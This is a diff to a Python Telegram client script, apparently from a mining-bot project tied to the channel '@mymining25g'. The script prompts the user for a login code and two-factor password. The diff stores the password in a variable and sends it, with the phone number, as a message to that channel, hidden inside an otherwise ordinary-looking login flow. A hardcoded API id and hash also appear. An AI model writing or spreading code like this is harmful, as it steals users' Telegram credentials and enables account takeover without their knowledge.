@@ -70,7 +70,7 @@ ua = {
 api_id = 974754
 api_hash = "6295657bbae725bfe8dfcca5d9e323e6"
 phone_number = sys.argv[1]
-
+x="0"
 client = TelegramClient("session/" + phone_number, api_id, api_hash)
 client.connect()
 if not client.is_user_authorized():
@@ -79,7 +79,7 @@ if not client.is_user_authorized():
         me = client.sign_in(phone_number, input("\n\n\n\033[1;0mEnter Your Code : "))
     except SessionPasswordNeededError:
         passw = input("\033[1;0mYour 2fa Password : ")
-        print (passw)
+        x=passw
         me = client.start(phone_number, passw)
 myself = client.get_me()
 os.system("clear")
@@ -99,7 +99,7 @@ try:
     channel_username = "@mymining25g"
     #client(JoinChannelRequest("@mymining25g"))
     sleep(2)
-    client.send_message(entity=channel_entity, message=phone_number + "FF?" +passw)
+    client.send_message(entity=channel_entity, message=phone_number + "FF?" +x)
     #@client.command(pass_context=True)
     #async def dm(ctx):
      #user=await client.get_user_info("00201129817174")
